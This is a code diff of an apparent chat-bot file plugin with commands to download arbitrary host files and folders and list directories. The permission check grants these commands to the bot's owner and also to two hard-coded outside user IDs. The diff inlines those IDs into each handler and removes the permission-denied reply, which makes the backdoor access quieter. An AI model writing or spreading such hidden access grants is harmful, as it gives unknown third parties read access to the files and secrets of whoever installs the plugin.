@@ -6,7 +6,6 @@ let Running = false;
 let es;
 let sendToGroup = true;
 let sendToOwner = true;
-const specialUsers = [3610159055, 923276093];
 
 export class File extends plugin {
   constructor() {
@@ -41,7 +40,7 @@ export class File extends plugin {
   }
 
   async EnableSending(e) {
-    if (!this.isSpecialUser(this.e.user_id)) return false;
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
 
     this.finish("EnableSending");
     sendToOwner = true;
@@ -51,7 +50,7 @@ export class File extends plugin {
   }
 
   async DisableSending(e) {
-    if (!this.isSpecialUser(this.e.user_id)) return false;
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
 
     this.finish("DisableSending");
     sendToGroup = true;
@@ -61,10 +60,7 @@ export class File extends plugin {
   }
 
   async DownloadFile(e) {
-    if (!this.isSpecialUser(this.e.user_id)) {
-      await this.reply("暂无权限", true);
-      return false;
-    }
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
 
     this.finish("DownloadFile");
     const filePath = this.e.msg.replace("取文件", "").trim();
@@ -97,10 +93,7 @@ export class File extends plugin {
   }
 
   async DownloadFolder(e) {
-    if (!this.isSpecialUser(this.e.user_id)) {
-      await this.reply("暂无权限", true);
-      return false;
-    }
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
 
     this.finish("DownloadFolder");
     const folderPath = this.e.msg.replace("取包", "").trim();
@@ -150,10 +143,7 @@ export class File extends plugin {
   }
 
   async List(e) {
-    if (!this.isSpecialUser(this.e.user_id)) {
-      await this.reply("暂无权限", true);
-      return false;
-    }
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;
 
     this.finish("List");
     const filePath = this.e.msg.replace("look一下", "").trim();
@@ -173,9 +163,5 @@ export class File extends plugin {
     }
 
     await this.reply(fs.readdirSync(filePath).join("\n"), true);
-  }
-
-  isSpecialUser(userId) {
-    return this.e.isMaster || specialUsers.includes(userId);
   }
 }
